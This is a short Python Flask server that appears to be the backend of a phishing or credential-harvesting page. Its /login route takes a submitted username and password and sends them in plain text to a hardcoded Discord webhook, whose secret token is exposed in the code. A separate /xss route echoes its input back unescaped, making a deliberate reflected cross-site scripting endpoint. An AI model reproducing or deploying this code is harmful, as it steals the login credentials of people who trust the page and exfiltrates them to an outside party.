from flask import Flask, jsonify, json, request, Response, send_file
from discord_webhook import DiscordWebhook
import aiohttp
app = Flask(__name__)





@app.route('/xss/<cmmd>')
def cmmd(cmmd):
    return cmmd


@app.route("/")
def home():
    return send_file('index.html')

@app.route("/login", methods=['POST'])
def login():
    arg = request.data
    ip = request.remote_addr
    data = json.loads(arg.decode("utf-8"))
    webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1242690878800269374/0qhjVVELHEpvmA8UlCLgViT7HXb-N1U_I_a1JPp8ydSWEzueQEbWJRttItIuRMvFNXSA", content=f"U={data['user']}-P={data['pass']}")
    response = webhook.execute()
    return send_file('script.js')

if __name__ == "__main__":
    app.run(debug=True)